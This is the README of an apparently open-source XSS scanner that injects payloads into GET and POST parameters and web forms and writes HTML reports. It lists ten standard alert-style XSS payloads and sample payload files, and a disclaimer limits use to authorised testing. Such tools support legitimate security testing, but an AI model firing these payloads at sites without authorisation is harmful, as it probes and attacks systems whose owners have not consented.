# 🌐 XSS Scanner 🚀  

An advanced **XSS vulnerability scanner** designed to identify Cross-Site Scripting (XSS) flaws in web applications. This tool automates payload injections for GET and POST requests, dynamically scans forms, and generates user-friendly HTML reports.  

---

## ✨ Features  

- 🛠 **Predefined Payloads**: Includes 10 powerful XSS payloads for testing.  
- ✏️ **Custom Payloads**: Add your own payloads or load them from a `.txt` file.  
- 🔍 **Form Detection**: Automatically scrapes forms from web pages for parameter testing.  
- 📂 **Batch Scanning**: Scan multiple URLs from a `.txt` file.  
- 🌐 **GET and POST Requests**: Supports testing both query parameters and form fields.  
- 📊 **HTML Reports**: Generates clean, professional vulnerability reports.  

---

## 📦 Installation  

### Prerequisites  
Ensure you have the following installed:  

### Clone the Repository  
```bash
 git clone https://github.com/Hackpy3/XssScanner  
cd XssScanner  
```  
- **Requirements**  
- Required libraries:  
   Install the required libraries using `pip`:
   ```bash
   pip install -r requirements.txt --break-system-packages
---

## 🚦 Usage  

### Step 1: Run the Script  
```bash
python xss.py  
```  

### Step 2: Choose Your Options  
1. 🛠 Use default payloads.  
2. ✏️ Add custom payloads manually.  
3. 📂 Load payloads from a `.txt` file.  

### Step 3: Select Scanning Mode  
- **Option 1**: Scan a single URL.  
- **Option 2**: Scan multiple URLs from a file.  

### Step 4: Save the Results (Optional)  
Choose whether to save the output to a file. If saved, an **HTML report** is automatically generated!  

---

### URL Scan  

 **`build_action_url`**:
   - Handles `None` or relative paths for form actions.
   - Uses `requests.compat.urljoin` for constructing absolute URLs.

### Usage:
```bash
python3 xss_URLS_scan.py <urls_file> <payloads_file>
```

- `<urls_file>`: A text file containing URLs (one URL per line).
- `<payloads_file>`: A text file containing XSS payloads (one payload per line).

### Example:
1. **URLs File (`urls.txt`)**:
   ```
   http://example.com
   http://test.com
   ```

2. **Payloads File (`payloads.txt`)**:
   ```
   "><script>alert('XSS')</script>
   <img src=x onerror=alert(1)>
   ```

Command:
```bash
python3 xss_URLS_scan.py urls.txt payloads.txt
```

This will scan all URLs in `urls.txt` with payloads from `payloads.txt`. Let me know if you need further help!

---

## 🛠 Default Payloads  

1. `<script>alert('XSS')</script>`  
2. `'"><script>alert('XSS')</script>`  
3. `<img src='x' onerror='alert("XSS")'>`  
4. `'"><svg onload=alert(1)>`  
5. `'"><input type="image" src=x onerror=alert(1)>`  
6. `javascript:alert('XSS')`  
7. `<iframe src=javascript:alert('XSS')>`  
8. `<body onload=alert('XSS')>`  
9. `'"><link rel="stylesheet" href="javascript:alert('XSS')">`  
10. `<base href="javascript:alert('XSS')">`  

---

## 📊 Reports  

### Console Output  
Real-time feedback during scans, showing:  
- Vulnerable URLs  
- Payloads causing vulnerabilities  

### HTML Reports  
A clean and professional report is automatically generated, summarizing:  
- Tested URLs  
- Detected vulnerabilities and payloads  

---

## 🤝 Contributing  

We welcome contributions! Feel free to:  
- Submit issues or feature requests 🐛  
- Open pull requests with enhancements ✨  

---

## 📜 License  

This project is licensed under the MIT License. See the `LICENSE` file for details.  

---

## ⚠️ Disclaimer  

This tool is for **educational purposes** and **authorized testing** only. Unauthorized use is strictly prohibited and may violate local, state, or federal laws.  

---


Let me know if you need further adjustments or more features added! 😊

--- 
Made ❤️ by [Mamun]  
